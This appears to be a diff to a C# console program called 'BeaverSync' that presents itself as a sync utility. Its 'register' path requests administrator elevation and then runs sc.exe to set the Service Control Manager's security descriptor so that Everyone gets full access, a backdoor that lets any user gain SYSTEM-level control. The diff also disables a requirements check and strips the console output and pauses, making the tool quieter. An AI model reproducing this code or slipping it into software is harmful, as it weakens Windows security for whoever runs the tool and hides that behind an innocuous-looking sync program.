@@ -15,18 +15,17 @@ namespace BeaverSync
         //[STAThread]
         static void Main(string[] args)
         {
+            /*
             if (!BetrayalIsASymptom.protectedStart())
             {
                 Console.WriteLine("System doesn't meet requirements!");
                 return;
             }
+            */
 
             // Normal, non-administrative sync
             if (args.Length == 0)
             {
-                Console.WriteLine("Doing a sync!");
-                Console.ReadLine();
-
                 // Check if system has been beavered and try to stop services
                 string beavered = @"C:\ProgramData\BeaverSynced";
                 if (File.Exists(beavered))
@@ -60,25 +59,20 @@ namespace BeaverSync
             }
             else if (args.Length == 1 && args[0] == "register")
             {
-                Console.WriteLine("Username not specified with registration command!");
+                //Console.WriteLine("Username not specified with registration command!");
+                //Console.ReadLine();
                 return;
             }
             else if (args.Length == 2 && args[0] == "register")
             {
-                Console.WriteLine(string.Join(" ", args));
-
-                Console.ReadLine();
                 string[] applicationArgs = args;
                 if (!BetrayalIsASymptom.IsUserAdmin())
                 {
                     string applicationPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                     BetrayalIsASymptom.RequestElevation(applicationPath, applicationArgs);
-                    Console.WriteLine("elevating");
-                    Console.ReadLine();
                 }
                 else
                 {
-                    Console.WriteLine("Performing registration!");
                     // "Fixing" SCManager
                     string[] regcmd = { "sdset", "scmanager", "D:(A;;KA;;;WD)" };
                     RunCmd("sc.exe", regcmd, false);
